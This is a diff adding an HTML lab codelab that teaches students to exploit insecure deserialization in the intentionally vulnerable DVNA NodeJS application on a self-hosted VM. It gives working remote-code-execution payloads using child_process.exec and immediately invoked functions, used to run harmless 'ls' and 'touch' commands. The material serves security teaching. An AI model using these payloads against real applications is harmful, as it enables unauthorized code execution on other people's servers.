@@ -1,0 +1,254 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>5.4: Insecure Deserialization (JavaScript)</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W5.4_insecure_deserialization_nodejs" title="5.4: Insecure Deserialization (JavaScript)" environment="web" feedback-link="https://docs.google.com/document/d/1U0TQUivuECCd4t8NlrO6Q3ULKN8EYRdHUuuiRLW3LuI">
+<google-codelab-step label="Introduction" duration="2">
+<p>Deserialization attacks can lead to devastating remote code execution vulnerabilities in web applications. While they are often associated with object-oriented frameworks in which object serialization is a commonly used feature such as Java and Python, they can also occur in PHP and Javascript. </p>
+<h2 is-upgraded><strong>What you will</strong> do</h2>
+<p>In this codelab, you will set up a vulnerable web application and exploit a Javascript deserialization vulnerability within it using Google Cloud Platform&#39;s Compute Engine. </p>
+<h2 class="checklist" is-upgraded><strong>What you&#39;ll learn</strong></h2>
+<ul class="checklist">
+<li>Launching VM instances with Docker containers on GCP&#39;s Compute Engine.</li>
+<li>Exploiting deserialization vulnerabilities</li>
+</ul>
+<h2 is-upgraded><strong>What you&#39;ll need</strong></h2>
+<ul>
+<li>A Google Cloud Platform account with either the $300 initial coupon or a Linux VM with Docker installed on it.</li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Launch VM" duration="5">
+<p>Begin by instantiating a Ubuntu VM on your Google Cloud Platform account.</p>
+<h2 is-upgraded>Option #1: Web console</h2>
+<ul>
+<li>Go to the <a href="https://console.cloud.google.com/compute" target="_blank">Compute Engine</a> page via <code>Google Cloud Console → Compute Engine → VM Instances</code></li>
+<li>Create a new instance named &#34;<code>dvna</code>&#34;</li>
+<li>Select <code>us-west1-b</code> as a zone</li>
+<li>For the Boot Disk, click &#34;Change&#34;, then select the x86/64 version of &#34;<code>Ubuntu 20.04 LTS</code>&#34; as a boot disk.</li>
+<li>In the &#34;<code>Firewall</code>&#34; section, click on the &#34;<code>Allow HTTP traffic</code>&#34; checkbox</li>
+<li>Create the VM</li>
+</ul>
+<h2 is-upgraded><strong>Option #2: Cloud Shell</strong></h2>
+<p>One can bring up a VM via the gcloud command in Cloud Shell. Visit the console and click on the Cloud Shell icon. Then, run the command below to launch the VM.</p>
+<pre><code>gcloud compute instances create dvna \
+  --image-family=ubuntu-2004-lts \
+  --image-project=ubuntu-os-cloud \
+  --zone=us-west1-b \
+  --machine-type=e2-micro \
+  --tags=http-server</code></pre>
+<h2 is-upgraded><strong>Note</strong></h2>
+<aside class="warning"><p>If you experience a resource error attempting to bring up the VM, select alternate availability zones in <code>us-west1</code> for the VM</p>
+</aside>
+</google-codelab-step>
+<google-codelab-step label="Setup VM" duration="2">
+<p>When the VM comes up, note its &#34;<code>External IP</code>&#34; address, then click on &#34;<code>SSH</code>&#34; to log into it.</p>
+<p class="image-container"><img style="width:624px" src="img/a74511d4339b9796.png"></p>
+<p>Note that you can also <code>ssh</code> into the VM from Cloud Shell via the command:</p>
+<pre><code>gcloud compute ssh dvna</code></pre>
+<p>Within the VM, run the following commands to install the latest Docker</p>
+<pre>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository &#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&#34;
+sudo apt-get update -y
+sudo apt-get install docker-ce -y</pre>
+<h2 is-upgraded>Run the Damn Vulnerable NodeJS Application container</h2>
+<ul>
+<li>Run the following command to start the container and name it &#34;<code>dvna</code>&#34;.</li>
+</ul>
+<pre>sudo docker run -di -p 80:9090 --name dvna appsecco/dvna:sqlite</pre>
+<ul>
+<li>The <code>-d</code> flag detaches after starting the container to allow it to run in the background</li>
+<li>The <code>--name</code> flag names the container &#34;<code>dvna</code>&#34;. This name will be used in subsequent docker commands to manage the container.</li>
+<li>The <code>-p 80:9090</code> flag remaps port <code>80</code> on the host to port <code>9090</code> on the container. The vulnerable container puts the website on port <code>9090</code>, but we want to access it via port <code>80</code> on the VM (as specified by allowing HTTP in the VM configuration) </li>
+<li>Twiddle your thumbs, get a cup of coffee, or get up and stretch for a minute. Leave the ssh window session running for subsequent steps.</li>
+</ul>
+<p>Note that if you want to shut your VM down, you will first need to execute the command</p>
+<pre>sudo docker stop dvna</pre>
+<p>Then, after bringing the VM back up, you can restart the container via</p>
+<pre>sudo docker start dvna</pre>
+</google-codelab-step>
+<google-codelab-step label="Setup application account" duration="3">
+<p>Test the DVNA instance by either clicking on the &#34;<code>External IP</code>&#34; address link in the Compute Engine UI or by visiting <code>http://</code>&lt;<code>External_IP</code>&gt;</p>
+<p class="image-container"><img style="width:515.81px" src="img/459350a467a619f9.png"></p>
+<h2 is-upgraded><strong>Create a new account on the application</strong></h2>
+<p>Click on &#34;Register a new account&#34;, then use your OdinID login to create one.</p>
+<p class="image-container"><img style="width:334px" src="img/94cb54d257ac56cc.png"></p>
+<p>Click on &#34;A8: Insecure Deserialization&#34;</p>
+<p class="image-container"><img style="width:223px" src="img/52e4d31b9355d438.png"></p>
+<p>Then, click on the Scenario link...</p>
+<p class="image-container"><img style="width:407px" src="img/fcba0a98f2887de5.png"></p>
+</google-codelab-step>
+<google-codelab-step label="Application" duration="5">
+<p>The application emulates a business-to-business process that allows a product manufacturer or distributor to upload a file of JSON objects that creates product entries in a catalog. Make a note of the URL route for the application (e.g. <code>/app/...</code>). When examining the source code of the application, we&#39;ll use this route to find the vulnerable code.</p>
+<h2 is-upgraded><strong>Application usage</strong></h2>
+<p>Create a file in your local file system with the following JSON object in it:</p>
+<pre><code>[
+  {&#34;name&#34;:&#34;Nintendo Switch&#34;,&#34;code&#34;:&#34;15&#34;,&#34;tags&#34;:&#34;gaming console&#34;,&#34;description&#34;:&#34;Nintendo&#39;s flagship gaming console&#34;},
+  {&#34;name&#34;:&#34;Playstation 4&#34;,&#34;code&#34;:&#34;17&#34;,&#34;tags&#34;:&#34;gaming console&#34;,&#34;description&#34;:&#34;Sony&#39;s flagshipgaming console&#34;}
+]</code></pre>
+<p>Click on &#34;Choose File&#34; and select the file you just created to upload the items. Then view the results.</p>
+<p class="image-container"><img style="width:624px" src="img/6dfa38b57b256272.png"></p>
+<p>The processing of uploads using JSON must be done on the server side via parsing (e.g. <code>JSON.parse</code>). It should never be done via evaluation. Unfortunately, NodeJS has a serialization and deserialization package that *does* perform an evaluation on the JSON that is being deserialized. If used in an application such as this one, code execution is possible:</p>
+<h2 is-upgraded>Application code</h2>
+<p>Clone the vulnerable application&#39;s git repository</p>
+<pre>git clone https://github.com/appsecco/dvna</pre>
+<p>Within this source tree, the code that implements particular URL routes in the application is found in <code>routes/app.js</code>. In the code, search for the route to find an <code>appHandler</code> that is registered which implements the bulk upload POST request (e.g. <code>router.post('/bulk...', )</code>). The code for this particular <code>appHandler</code> is implemented in <code>core/appHandler.js.</code></p>
+<p>Examine the <code>appHandler.js</code> file and find the handler code for the route. </p>
+<ul>
+<li><strong>What is the line of code that performs the deserialization?</strong></li>
+<li><strong>At the top of the file, find the &#34;</strong><strong><code>require</code></strong><strong>&#34; call at the top of the file that includes the name of the package used to perform the deserialization.</strong></li>
+</ul>
+<p>Make a mental note to never use this package in a web application</p>
+</google-codelab-step>
+<google-codelab-step label="Vulnerability" duration="6">
+<p>Search for &#34;&lt;<code>name-of-vulnerable-package</code>&gt; <code>deserialization nodejs</code>&#34; to find a write-up of how to exploit the use of deserialization in this package. We will be using this technique to create a file on the server that is hosting the vulnerable application. Answer the following question for your lab notebook:</p>
+<ul>
+<li><strong>What is the name of the special prefix that the package uses to denote a string that should be </strong><strong><code>eval()</code></strong><strong>&#39;d within the serialized object when it is deserialized?</strong></li>
+</ul>
+<p>This prefix will be denoted with 3 dots (<code>..._function()</code>) in the code examples that follow</p>
+</google-codelab-step>
+<google-codelab-step label="Serialization example" duration="6">
+<p>We will now show this in a simple code example.</p>
+<ul>
+<li>Visit <a href="https://repl.it" target="_blank">https://repl.it</a> </li>
+<li>Select NodeJS</li>
+<li>In the code window, fill in the following (replacing the package name):</li>
+</ul>
+<pre>var serialize = require(&#39;&lt;name-of-vulnerable-package&gt;&#39;);
+var ls_serialize_me = {rce : function(){ require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) });}}
+console.log(&#34;Serialized: \n&#34; + serialize.serialize(ls_serialize_me));</pre>
+<p>The code creates an object called <code>ls_serialize_me</code> which is a JavaScript object. Note that this is *not* a JSON object because it does not adhere to the strict definition of JSON&#39;s data types! <code>ls_serialize_me</code> contains an object property called <code>rce</code> that is a JavaScript function. The function invokes the <code>exec</code> method in the <code>'child_process'</code> package to perform an <code>ls</code> of the root file system &#39;<code>/</code>&#39;. It also defines a callback function that sends the output of the function (<code>stdout</code>) to the console (via <code>console.log</code>). </p>
+<ul>
+<li>Run the code above and view the object after it has been serialized. Note that repl.it may require you to install the package manually. You can do so by clicking on the &#39;package&#39; icon on the left.</li>
+</ul>
+<p class="image-container"><img style="width:555px" src="img/108c7767fcf9f550.png"></p>
+<p>For your lab notebook,</p>
+<ul>
+<li><strong>Show the output and note the specially named function that is used to invoke the </strong><strong><code>exec</code></strong><strong> call. </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Function expressions in Javascript" duration="6">
+<p>The serialized object creates the function definition, but does not create an invocation of the function. Unfortunately, JavaScript allows you to define and invoke a function via its <a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression" target="_blank">immediately invoked function expression</a>. To invoke the function when it is defined, we only need to include the function invocation syntax &#39;<code>()</code>&#39;. </p>
+<p>Consider the code below. <code>f</code> is defined as a function that outputs &#39;<code>hello f</code>&#39; to the console. <code>g</code>, on the other hand, declares a function expression that is invoked and returns a value (the number <code>1</code>).</p>
+<pre>var f = function() {
+  console.log(&#39;hello f&#39;);
+};
+
+var g = function() {
+  console.log(&#39;hello g&#39;);
+  return 1;
+} ();</pre>
+<ul>
+<li>Copy and paste the code into <a href="https://repl.it" target="_blank">repl.it</a> </li>
+<li>Then, in the console window, type the following commands after the initial output. </li>
+</ul>
+<pre>typeof(f)
+typeof(g)
+f()
+g</pre>
+<ul>
+<li><strong>Take a screenshot of the output to include in your lab notebook.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Add function expression to serialized object" duration="5">
+<p>Take the serialized object output from the Serialization example and create a string out of it, escaping any single quotes. At the end of the function definition, include the <code>()</code> to make it an expression that will be invoked upon deserialization. The vulnerability is that the deserialization code does not take into account JavaScript&#39;s immediately invoked function expressions which leads to the automatic execution of the function as soon as it is deserialized. A template of this is shown below:</p>
+<pre>var ls_payload = &#39;{&#34;rce&#34;:&#34;...function(){require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) { console.log(stdout) });}()&#34;}&#39;;
+serialize.unserialize(ls_payload);</pre>
+<p>Run the code in <a href="https://repl.it" target="_blank">repl.it</a></p>
+<ul>
+<li><strong>Show the output of its execution in your lab notebook.</strong></li>
+</ul>
+<p>Is this something you would like to have happen on the server running your web application? An educated guess is that it&#39;s not something <a href="https://avatao.com/blog-deep-dive-into-the-equifax-breach-and-the-apache-struts-vulnerability/" target="_blank">Equifax</a> wanted.</p>
+</google-codelab-step>
+<google-codelab-step label="Exploit creation" duration="5">
+<p>We are now ready to exploit the DVNA level. Replace the &#39;<code>ls</code>&#39; command with a &#39;<code>touch</code>&#39; command that will create a file in &#39;<code>/tmp</code>&#39; on the server if deserialized insecurely.</p>
+<h2 is-upgraded><strong>Create the base serialized object</strong></h2>
+<p>As done with the prior example, create a serialized object that performs the command. Replace &#39;&lt;<code>ODIN_ID</code>&gt;&#39; with your own OdinID. Note that since we do not care about the output of the command itself, we can simplify the function expression. </p>
+<pre>var touch_serialize_me = {rce : function(){ require(&#39;child_process&#39;).exec(&#39;touch /tmp/&lt;ODIN_ID&gt;&#39;, function() {} );}}</pre>
+<ul>
+<li>Run the code in <a href="https://repl.it" target="_blank">repl.it</a> to obtain the base serialized version </li>
+</ul>
+<pre>{&#34;rce&#34;:&#34;...function(){ require(&#39;child_process&#39;).exec(&#39;touch /tmp/...&#39;, function() {} );}&#34;}</pre>
+<ul>
+<li>Create a JavaScript string for the serialized version (escaping out the single quotes) and add the <code>()</code> to invoke the function upon deserialization. It should look similar to below</li>
+</ul>
+<pre>var touch_payload = &#39;{&#34;rce&#34;:&#34;...function(){ require(\&#39;child_process\&#39;).exec(\&#39;touch /tmp/...\&#39;, function() {} );}()&#34;}&#39;</pre>
+<ul>
+<li>We can now test our payloads to make sure they work. We will first modify the &#39;<code>ls_payload</code>&#39; to perform a listing of <code>/tmp</code>. Then, we will deserialize the <code>ls_payload</code> to show the initial contents of <code>/tmp</code>, deserialize the <code>touch_payload</code> to create a file in <code>/tmp</code>, then deserialize the <code>ls_payload</code> again to show we have successfully created the file. In <a href="https://repl.it" target="_blank">repl.it</a>, define the two payloads for this.</li>
+</ul>
+<pre>var ls_payload = &#39;{&#34;rce&#34;:&#34;...function(){require(\&#39;child_process\&#39;).exec(\&#39;ls /tmp\&#39;, function(error, stdout, stderr) { console.log(stdout) });}()&#34;}&#39;;
+
+var touch_payload = &#39;{&#34;rce&#34;:&#34;...function(){ require(\&#39;child_process\&#39;).exec(\&#39;touch /tmp/wuchang\&#39;, function() {} );}()&#34;}&#39;</pre>
+<ul>
+<li>Then, in the console window on the right, invoke the individual deserialization commands. This ensures the output is shown in-order</li>
+</ul>
+<pre>serialize.unserialize(ls_payload);
+serialize.unserialize(touch_payload);
+serialize.unserialize(ls_payload);</pre>
+<ul>
+<li><strong>Take a screenshot of the output in the console, showing that the file with your OdinID has been created.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Visit the vulnerable container" duration="3">
+<p>We will now examine the vulnerable application backend so that we can see what changes we can make on it by running our exploit. In your <code>ssh</code> session on the VM that is running the vulnerable web application container.</p>
+<ul>
+<li>Run a <code>docker exec</code> command that will run an interactive shell session within the <code>dvna</code> container.</li>
+</ul>
+<pre>sudo docker exec -it dvna /bin/bash</pre>
+<ul>
+<li>The <code>-t</code> flag specifies that we want an interactive session to run the <code>/bin/bash</code> command with</li>
+<li>From the command prompt, do a directory listing of <code>/tmp</code>, the location where we will be creating the file in</li>
+</ul>
+<pre>ls /tmp</pre>
+<ul>
+<li>Leave the session open so you can perform the command again after our exploit is deployed. </li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Deploy the exploit" duration="5">
+<p>Now that we have a functional exploit, create a file locally that will contain the exploit. Note that while we escape out the single quote (e.g. <code>\'</code>) when the exploit is specified in a JavaScript string denoted by single quotes, we do not need them when uploading the serialized object as a file. </p>
+<ul>
+<li>Create the file that contains the deserialization exploit we&#39;ve just created similar to below. Note that the application expects an array of items <code>[ ].</code></li>
+</ul>
+<pre>[{&#34;rce&#34;:&#34;...function(){ require(&#39;child_process&#39;).exec(&#39;touch /tmp/...&#39;, function() {} );}()&#34;}]</pre>
+<ul>
+<li>Go back to the &#34;Bulk Import Products&#34; page and upload the file.</li>
+<li>The original list of consoles should appear as before with nothing new added.</li>
+<li>Go back to the docker container session and perform the listing command again</li>
+</ul>
+<pre>ls /tmp</pre>
+<ul>
+<li><strong>Take a screenshot of the output of both </strong><strong><code>ls</code></strong><strong> commands to include in your lab notebook</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Cleanup" duration="2">
+<p>Ensure you have collected all of the necessary screenshots for your lab notebook, then delete the VM to save $.</p>
+<p class="image-container"><img style="width:526px" src="img/780f8299ac930ed5.png"></p>
+<p>Alternatively, you can delete the VM via Cloud Shell</p>
+<pre><code>gcloud compute instances delete dvna --zone=us-west1-b</code></pre>
+<h2 is-upgraded><strong>Congratulations</strong></h2>
+<p>You&#39;ve completed the JavaScript deserialization lab covering:</p>
+<ul>
+<li>How object deserialization works in NodeJS</li>
+<li>How an insecure deserialization that evaluates objects as code can lead to vulnerabilities</li>
+<li>How to exploit insecure deserialization to gain unauthorized access to a web application&#39;s backend server.</li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
